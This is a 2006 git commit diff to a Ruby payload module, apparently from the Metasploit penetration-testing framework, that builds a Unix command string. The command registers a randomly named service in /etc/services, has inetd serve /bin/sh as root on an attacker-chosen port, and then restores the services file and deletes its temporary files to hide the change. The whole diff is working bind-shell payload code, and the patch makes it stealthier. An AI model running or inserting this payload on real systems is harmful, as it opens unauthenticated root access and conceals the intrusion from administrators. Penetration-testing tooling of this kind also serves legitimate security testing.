d07e5fd3303a33fd167c81d3d5dad46b23ad1dc3
Matt Miller <mmiller@hick.org>
2006-01-19 17:03:55 +0000

    patch from bmc
    git-svn-id: file:///home/svn/incoming/trunk@3410 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/payloads/singles/cmd/unix/bind_inetd.rb
+++ modules/payloads/singles/cmd/unix/bind_inetd.rb
@@ -43,31 +43,34 @@ module BindInetd
 	# Returns the command string to use for execution
 	#
 	def command_string
-		tmp = "/tmp/.msf_inetd" + $$.to_s
+		tmp_services = "/tmp/." + Rex::Text.rand_text_alpha(32)
+		tmp_inet = "/tmp/." + Rex::Text.rand_text_alpha(32)
+		svc = Rex::Text.rand_text_alpha_lower(9)
+
 		cmd =
 			# Create a clean copy of the services file
-			"grep -v msfbind /etc/services>#{tmp};" +
+			"cp /etc/services #{tmp_services};" +
 			
-			# Add our service to it
-			"echo msfbind #{datastore['LPORT']}/tcp>>#{tmp};" +
-			
-			# Overwrite the services file with our new version
-			"cp #{tmp} /etc/services;" +
+			# Add our service to the system one
+			"echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +
 			
 			# Create our inetd configuration file with our service
-			"echo msfbind stream tcp nowait root /bin/sh sh>#{tmp};" +
+			"echo #{svc} stream tcp nowait root /bin/sh sh>#{tmp_inet};" +
 			
 			# First we try executing inetd without the full path
-			"inetd -s #{tmp} ||" +
+			"inetd -s #{tmp_inet} ||" +
 			
 			# Next try the standard inetd path on Linux, Solaris, BSD
-			"/usr/sbin/inetd -s #{tmp} ||" +
+			"/usr/sbin/inetd -s #{tmp_inet} ||" +
 			
 			# Next try the Irix inetd path
-			"/usr/etc/inetd -s #{tmp};"
+			"/usr/etc/inetd -s #{tmp_inet};" +
+			
+            # Overwrite services with the "clean" version
+			"cp #{tmp_services} /etc/services;" +
 
 			# Delete our configuration file
-			"rm #{tmp};";
+			"rm #{tmp_inet} #{tmp_services};";
 
 		return cmd
 	end
